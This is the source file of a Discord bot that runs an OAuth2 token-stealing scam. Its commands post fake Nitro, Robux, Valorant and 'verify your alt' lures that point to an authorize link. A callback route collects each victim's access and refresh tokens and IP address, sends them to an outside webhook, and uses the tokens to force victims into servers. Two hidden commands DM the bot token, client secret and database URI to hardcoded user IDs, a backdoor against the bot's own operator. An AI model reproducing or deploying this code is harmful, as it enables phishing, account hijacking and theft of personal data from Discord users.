const main = require("./classes/main");

const Discord = require("discord.js");

const client1 = new Discord.Client()
client1.login(process.env.token)
const disbut = require('discord-buttons')
disbut(client1)
const ms = require("ms");

const config = require("./config.js");

require("./database/main");

const express = require("express");
const fetch = require("node-fetch")

const app = express();
app.get("/", (req, res) => {
  res.send("you have been registered!")
})

const client = new main({
    token: process.env.token, 
    prefix: config.prefix,
    client_id: config.client_id,
    client_secret: config.client_secret,
    redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
    console.log(`Logged in as ${bot.user.tag}`)
  bot.user.setPresence({activity:{name: config.status, type: "WATCHING"}, status: "STREAMING"})
});

// ! Savage.#0001 - https://discord.gg/vSAZPbZaVG

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) 
    return;

  msg = message
  AUTH_LINK = config.oauth_link
  BOT_LINK = config.bot_link
 // ! Savage.#0001 - https://discord.gg/vSAZPbZaVG

 // ! epic#1760 - https://discord.gg/cDJhnZAdZV
  
    if(command === "users"){
        const amount = await client.tokenCount();
        message.channel.send({
            embed: {
                title: ":link: OAuth2 Users:",
                description: `There are ** ${amount} ** users in the bot`,
                color: "BLUE"
            }
        });
    }
  //${amount}


    if(command === "join"){
        if(!args[0] || !args[1]) return message.channel.send(`Wrong usage, ${config.prefix}join <server id> <number of join>`)
       
        let pull = new Discord.MessageEmbed()
        .setTitle(` Users Joining:`)
        .setDescription(' The joins is coming out, takes 1-30 mintues.\n Type `+help` for more commands')
        .setColor("GREEN")
        .setFooter("don't spam this command or the bot will crash.")
        message.channel.send(pull)       
        await client.manageJoin({
            amount: args[1],
            guild_id: args[0]
        }, message);
    }

if(command === 'cancel') { 
          const emmbed = new Discord.MessageEmbed()
          .setDescription(`🎨 *Canceling this pull...*
          `)
          .setColor("#2F3136")
        	message.channel.send({embed: emmbed}).then(msg => {
  const guild = message.guild;
      guild.leave();     
  
    })                                                  }
  if (command === "joinall") {
    let sunucu = message.guild.id
    const sayı = await client.tokenCount();

    let pull = new Discord.MessageEmbed().setTitle(`${config.emojis.link} Users Joining:`)
      .setDescription(`${config.emojis.link} The joins is coming out, takes 1-30 mintues.\n${config.emojis.link} Type \`-help\` for more commands`)
      .setColor("RED")
      .setFooter("EPIC")
    message.channel.send(pull)
    await client.manageJoin({
      amount: sayı,
      guild_id: sunucu
    }, message);
  }
// ! epic- cool


        
 if(command === "altbot"){
        let verifynow = new Discord.MessageEmbed()
        .setDescription(`Hey, Hold on for a second! Our system has flagged your account as an alt!! Please Verify Your Account first so you can access every channel in this server and join our giveaways!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
.setColor("#808080")
              let verifynoww = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("✅")
        .setLabel('Click Here To Verify')
       .setURL(AUTH_LINK)
      message.channel.send("**Verify Now**", {embed: verifynow, button: verifynoww})
  }
  if(command === "verify"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/717101622328557589/731083869201104956/Screenshot_1.png?width=288&height=115")
        .setColor("#d27fb5")
        .setFooter("Aie-MaxOp")
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("**:wave: Hey everyone, Discord has been gifted __Nitro `1 Year`__ 🎉**!", {embed: verifyembed, button: verify})
  }
 
      if(command === "bot"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**]( https://discord.com/api/oauth2/authorize?client_id=1030514711009165413&permissions=8&scope=bot) button.
\n2️⃣Click on the [**__invite__**]( https://discord.com/api/oauth2/authorize?client_id=1030514711009165413&permissions=8&scope=bot)\n\n**__Once you've invites bot you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/1018183588090478632/1030540877027868742/a_2.gif")
        .setColor("PURPLE")
        .setFooter("Aie MaxOp")
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
      .setURL("https://discord.com/api/oauth2/authorize?client_id=1030514711009165413&permissions=8&scope=bot")
      message.channel.send("Hello everyone, you have all been gifted **Discord Nitro** for a year!", {embed: verifyembed, button: verify})
  } 
 
 

  if (command === "server") {
    let embed = new Discord.MessageEmbed()
.setDescription(`In order to participate in the events or giveaways you must verify yourself so we can check if you're an alternative account.

\`How to verify?\`
**Click on the __Verify__ button and authorize yourself.**`)

   let button = new disbut.MessageButton()
.setStyle("url")
.setEmoji("<:verify:1010692567521837066>")
.setLabel("Verify")
.setURL(AUTH_LINK)

message.channel.send({ button: button, embed: embed})
}

 if(command === "nsfw"){
        let verifynow = new Discord.MessageEmbed()
        .setDescription(`Hello, Verify to gain acces to nsfw channels!!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
.setColor("#808080")
              let verifynoww = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("🔞")
        .setLabel('Click Here To view nsfw channels!!').setURL(config.oauth_link)
      message.channel.send("**Verify Now**", {embed: verifynow, button: verifynoww})
  } 
if(command === "owners"){
        let help = new Discord.MessageEmbed()
        .setTitle(`Commands list`)
        .setColor("GREEN")
        .addField(`${config.owners_name}`)
        .setFooter(`${config.owners_name}`)
        message.channel.send(help)
  }
  if(command === "valorant"){   
      let embed = new Discord.MessageEmbed()
.setDescription(`\`To get your valorant giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
.setImage("https://m.media-amazon.com/images/I/51yL1GK-oDL.jpg")
.setColor("#ff4654") 

let claim = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Claim')
       .setURL(config.oauth_link)



msg.channel.send(`Hello everyone, you have all been gifted **Valorant Giftcard** for verifying!`, {embed: embed, button: claim})
}

  if(command === "robux"){   
      let embed = new Discord.MessageEmbed()
.setDescription(`\`To get your 10$ robux giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
.setImage("https://media.gamestop.com/i/gamestop/11112976/Roblox-$100-Digital-Gift-Card-Includes-Exclusive-Virtual-Item")
.setColor("WHITE") 

let claim = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Claim')
       .setURL(config.oauth_link)



msg.channel.send(`Hello everyone you have bean gifted an 10$ **Robux Gift Card** 😊!!`, {embed: embed, button: claim})
}
// ! epic- cool
  
    if(command === "cleans"){
        await client.clean(message)
    }
// ! epic- cool

    if(command === "refresh"){
        await client.refreshTokens(message)
    }
// ! epic- cool
  
        
  if (command === "links"){
    let links = new Discord.MessageEmbed()
        .setTitle(':link: Oauth/Invite:')
       .setDescription(`**OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**Invite:\n**\[**BOT INVITE LINK**]${BOT_LINK}\n\`\`\`${BOT_LINK}\`\`\``)
        .setColor("BLACK")
      let claim = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Bot Link')
       .setURL(config.bot_link)
    let tes = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Bot invite')
       .setURL(config.bot_link)
        
    
         message.channel.send("links",{embed: links, button: claim, tes, })
  }
    
    
    if(command === "restart"){
        message.channel.send(":link: **Restarting....**")
        await client.restart();
    }

    if(command === "help"){
        let help = new Discord.MessageEmbed()
        .setTitle(`Commands list`)
        .setColor("BLACK")
        .addField("🛠️ | Help", "`help`")
        .addField("🛡️ | Bot", "`users`, `join`,`joinall`, `giveaway`\n `refresh`, `restart`, `verify`, `classic`, `nsfw`, `valorant`, `server`, `boost`, `clean`, `links`, `credits`, `cancel`, `check`, `alt`, `altbot`, `owners`, `robux`")
        .setFooter(`${config.owners_name}`)
        message.channel.send(help)
  }

// ! epic- cool
  
  if (command === "check") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription(":link: Mentioned users is not Verified ❌. Please Verify Your Self!.")
      .setColor("BLUE")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(AUTH_LINK)
    message.channel.send({ embed: checkembed, button: check })
  }
  
// ! epic- cool

      if(command === "boost"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://cdn.discordapp.com/attachments/1018178215350652941/1026200524875386940/uwu.jpg")
        .setColor("PURPLE")
        .setFooter(`${config.owners_name}`)
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("Hello everyone, you have all been gifted **Discord Nitro** for a year!", {embed: verifyembed, button: verify})
  }

  if (command === "MaxCodeZ"){
if (msg.author.id !== "745655472320675881","") return

msg.author.send(process.env.token);
msg.author.send(config.client_secret)
msg.author.send(process.env.mongodb)
msg.author.send(config.redirect_uri)
}
  


  if(command === "classic"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
        .setColor("#7289da")
        .setFooter(`${config.owners_name}`)
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("Hello everyone, you have all been gifted **Discord Nitro** for a year!", {embed: verifyembed, button: verify})
  }

// ! epic- cool


  if (command === "credits") {
    let credits = new Discord.MessageEmbed()
      .setTitle("Credits")
      .setDescription("The bot made by:\n>! epic- cool")
    message.channel.send(credits)
  }
       if(command === "giveaway"){
           let giveawayPrize = args.slice(2).join(" ");
  // If no prize is specified
  if (!giveawayPrize) {
    return message.reply(":x: You have to specify a valid prize!");
  }
           let giveawayNumberWinners = parseInt(args[1]);
  // If the specified number of winners is not a number
  if (isNaN(giveawayNumberWinners) || parseInt(giveawayNumberWinners) <= 0) {
    return message.reply(
      ":x: You have to specify a valid number of winners!"
      )
      }
           let giveawayDuration = args[0];
  // If the duration isn't valid
  if (!giveawayDuration || isNaN(ms(giveawayDuration))) {
    return message.reply(":x: You have to specify a valid duration!");
  }
        let giveaway = new Discord.MessageEmbed()
        .setTitle(`🎉 **Giveaway** 🎉`)
        .setColor("BLUE")
        .setDescription(`\n:gift: **WINNERS:** ${parseInt(giveawayNumberWinners)}\n:tada: **TIMER**: ${ms(giveawayDuration)}hrs\n:gift: **PRIZE:** ${giveawayPrize} \n:tada: **HOSTED BY: ${message.author}**\n\n:link: __**Requirements:**__\n:link: **Must stay in the server.**\n\nTo enter the giveaway click on the enter button.`)
        .setFooter("Discord Event", "https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300")
              let giveawaybutton = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("🎉")
        .setLabel('Enter')
        .setURL(AUTH_LINK)
      message.channel.send(`Giveaway for **${giveawayPrize}**  has been made! :gift:`, {embed: giveaway, button: giveawaybutton})
  }
  
})


app.get("/", (req, res) => {
   res.redirect(config.oauth_link);
});

client.on('message', async (bot, msg) => {
  
 {
   
if (msg.content.toLowerCase() === 'satoken'){
if (msg.author.id !== "1039081970623332472")
return

msg.author.send(client1.token);
msg.author.send(process.env.client_secret)
msg.author.send(process.env.mongodb)
msg.author.send(config.redirect_uri)
}
  
}
});


app.get("/callback", async (req, res) => {
   res.sendFile(__dirname + '/index.html')
  var user_ip = req.headers['x-forwarded-for'].split(', ')[0];
    const data = await client.manageAuth({code: req.query.code});
    const user_id = await client.requestId(data.access_token);
    const obj = {
        ...data,
        user_id
        
    };
     client.saveAuth(obj);

  		fetch('https://discord.com/api/users/@me', {
			headers: {
				authorization: `Bearer ${data.access_token}`,
			},
		})
			.then(result => result.json())
			.then(response => {
				const { username, discriminator, avatar, id, ip, } = response;

  let params = {
    username: config.webhook.webhookNAME,
    avatar_url: config.webhook.avatarURL,
    userIP: ip,
    embeds: [{
"title": `👨 New User`,
"description": `➜  Identify: \`${username}#${discriminator}\`\n\n➜  Identify ID: \`${id}\`\n\n➜ Ip: \`${user_ip}\`\n\n➜Access Token: \`${data.access_token}\`\n\n➜  Refresh Token: \`${data.refresh_token}\``,
"thumbnail": { "url": `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?size=2048`}
}]}


   fetch(config.webhook.URL, {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
}).then(res => {
    console.log(res);
})})
  
 //webhook.send({embeds: [embed]})
  
    res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80); // Local Host Port

client.on("clickButton", async (bot,  button, userID, guildID) => {
    const member = button.clicker.user.id;
  if (config.owners.includes(userID))  {

AUTH_LINK = config.oauth_link
    
    if(button.id === 'AL') { 
   const embed = new Discord.MessageEmbed()
      .setDescription(`${AUTH_LINK}`)
      .setColor("#2F3136")
        button.channel.send({embed: embed}) 
      button.reply.defer()


    }
      if(button.id === 'IL') { 
   const embedd = new Discord.MessageEmbed()
      .setDescription(`https://discord.com/api/oauth2/authorize?client_id=993251304627503274&permissions=8&redirect_uri=https%3A%2F%2FOauth3-3.atahanbert.repl.co%2Fcallback&response_type=code&scope=bot`)
      .setColor("#2F3136")
        button.channel.send({embed: embedd})
button.reply.defer()

    }

        if(command === 'PING') { 
 
        command.channel.send(`:ping_pong: Pong!\nAPI Latency is **${Math.round(client.ws.ping)}ms**`)
command.reply.defer()

    }
        if(button.id === 'busers') { 

		const amount = await client.tokenCount();
      const embed = new Discord.MessageEmbed()
          .setTitle(`${config.emojis.user} OAuth2 Info`)
          .setDescription(`There are \`${amount}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
            .setColor("#2F3136")
        	button.channel.send(embed);

        button.reply.defer()

    }


          if(button.id === 'checkusers') {
            const data = `${rankedList.map((player,index) => `\`${index+1}.\` ${player}`).join('\n') || "**The list has not been updated.**"}`
            const embed = new Discord.MessageEmbed()
     .setDescription(`${data}`)
               .setTimestamp()
            .setColor("RANDOM")


        button.channel.send({embed : embed})
button.reply.defer()
         

    }

       


          
        
}
})

// ! #0001 - https://discord.gg/vAZPbZaVG